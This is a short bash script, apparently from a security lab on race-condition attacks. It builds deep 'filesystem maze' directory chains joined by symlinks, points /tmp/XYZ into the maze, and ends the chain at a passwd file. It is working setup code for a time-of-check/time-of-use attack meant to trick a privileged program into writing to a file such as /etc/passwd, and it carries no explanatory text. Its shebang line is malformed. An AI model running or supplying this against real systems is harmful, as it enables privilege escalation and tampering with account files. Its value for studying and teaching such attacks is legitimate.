#/usr/bin/evn bash

# From: https://lthieu.wordpress.com/2012/10/22/filesystem-mazes-race-condition-attack-1/

depth=1000
chain=20
cur_dir=$(pwd)

base_link="$(for i in $(seq -s" " 1 $depth); do echo "d/"; done | tr -d '\r\n')"
#echo $base_link;

for (( i = 0; i < $chain; i++ ))
do mkdir $i
  cd $i
  mkdir -p $base_link
  cd ..
done;

for (( i = 0; i < $(( $chain-1 )); i++ ))
do path="$cur_dir""/""$i""/""$base_link"
  j=$(( $i + 1 ))
  dst="$cur_dir""/""$j""/""$base_link"
  cd $path
  ln -s $dst lnk
done;
entry_dst=$cur_dir"/0/"$base_link
cd $cur_dir
ln -f -s $entry_dst /tmp/XYZ

pub_path=$cur_dir"/etc/passwd"
cd $cur_dir"/19/"$base_link
ln -f -s $pub_path lnk
